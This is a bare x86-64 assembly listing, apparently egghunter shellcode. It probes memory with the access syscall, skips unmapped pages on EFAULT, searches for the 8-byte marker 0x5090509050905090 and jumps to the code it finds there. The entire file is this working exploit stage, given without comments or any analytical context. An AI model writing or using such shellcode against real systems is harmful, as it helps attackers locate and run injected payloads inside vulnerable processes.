global _start

_start:

	xor edx, edx
	
_increase1:
	or dx, 0xfff
	
_increase2:
	inc edx 

_search:
	push 21 
	pop rax
	lea rdi, [rdx+8]
	syscall
	cmp al, 0xf2
	je _increase1
	mov r12, 0x5090509050905090
	cmp r12, [rdx] 
	jne _increase2 
	jmp rdx	



